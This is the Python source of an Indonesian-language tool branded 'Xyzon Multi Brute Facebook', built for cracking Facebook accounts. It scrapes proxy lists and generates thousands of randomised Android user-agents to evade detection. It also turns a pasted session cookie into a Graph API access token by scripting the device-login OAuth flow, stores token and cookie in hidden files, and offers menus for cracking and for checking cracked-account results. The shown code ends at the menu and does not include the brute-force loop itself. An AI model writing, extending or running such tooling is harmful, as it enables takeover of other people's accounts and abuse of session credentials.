#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as XyzonXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; XMBF | Xyzon Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
uman,usman1=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
printcp=[]
oks=[]
cps=[]
redmi=[]
ugent=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mXyzonXD')
prox=open('.prox.txt','r').read().splitlines()
###----------[ GENERATE USERAGENT ]---------- ###
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen2.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen2.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]                 _  _ _   _ ___  ____ _  _    _  _ ___  
[bold green]                  \/   \_/    /  |  | |\ | __  \/  |  \ 
[bold green]                 _/\_   |    /__ |__| | \|    _/\_ |__/ 
             """,width=90,padding=(0,8),title=f"LOGO",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def vevek():
	cetak(panel(f" [bold white][[bold green]+[bold white]][bold cyan] Hallo Cuy Gw [bold green]XyzonXD [bold cyan]Gw Di Sini Selaku Author Disini Untuk Menggunakan Script Ini Sebaik Mungkin Dan Jangan Di salah Gunakan Yakan Awokawokawok  Dan Jangan Di Buat Prem Ya Adik² Terimakasih \n [bold white][[bold green]+[bold white]][bold cyan] Thanks To All",width=90,padding=(0,2),style=f"bold white"))
	time.sleep(10)
	login()
	
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"[[bold green]01[bold white]] [bold cyan]Login Menggunakan Cookie [bold white][[bold green] ON [bold white]]        [[bold green]03[bold white]] [bold cyan]Tutorial Ambil Cookie [bold white][[bold green] ON [bold white]]\n[[bold green]02[bold white]] [bold cyan]Doa Sebelum Crack [bold white][[bold green] ON [bold white]]               [[bold green]04[bold white]] [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi",style=f"bold white"))
	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
	if vevek in ['1','01']:
		laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok()
	elif vevek in ['2','02']:
		doa_halal()
	elif vevek in ['3','03']:
		cetak(panel(f"[bold cyan]Anda Akan Di Arahkan Ke Youtube Dan Liat Lah Dengan Mata Kepala Anda Sendiri Bagaimana Mengambil Cookies Yang Benar Dan Ikut Tutorial Nya",width=90,title=f"[bold green]Cookies Facebook",padding=(0,3),style=f"bold white"))
		os.system("xdg-open https://youtu.be/iPs-ShFVOJA")
		time.sleep(3)
		exit()
	elif vevek in ['4','04']:
		result()
	elif vevek in ['5','05']:
		os.system("xdg-open https://wa.me/+6282183929059?text=Assalammualaikum+Bagi+Tutorial+Dong+Admin+Pemula+Nih")
		time.sleep(3)
		exit()
	else:
		print(' [+] \33[1;91mPilih Yang Bener Asu ')
		time.sleep(5)
		back()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			li = ' [+] Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login123()
		
def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
	try:
		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
		your_cookies = input(' [+] Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" [+] \33[1;91mCookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n [+] Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n [+] \33[1;96mLogin Berhasil | python run.py");exit()
			except Exception as e:
				print(" [+] \33[1;91mCookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	pengguna = requests.get('https://api.countapi.xyz/hit/Brayen/visits').json()["value"]	
	dia.append(panel(f'[bold white][[bold green]+[/][bold white]][/] [bold cyan] Username : [bold green]{my_name}[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]User Ip  : [bold green]{ip}[/][/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]User Sc  : [bold green]{pengguna}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	dia.append(panel(f'[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Author : [bold green]BintangTzy[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Recode : [bold green]XyzonXD[/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Versi  : [bold green]2.1[/][/]\n[bold white][[bold green]+[/][bold white]][/]  [bold cyan]Status : [bold green]Premium[/][/] ',width=44,padding=(0,3),style=f"bold white"))
	console.print(Columns(dia))
	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]BintangTzy[bold cyan] Yang Telah Membuat Script Ini, XyzonXD Multi Brute Facebook',width=90,style=f"bold white"))
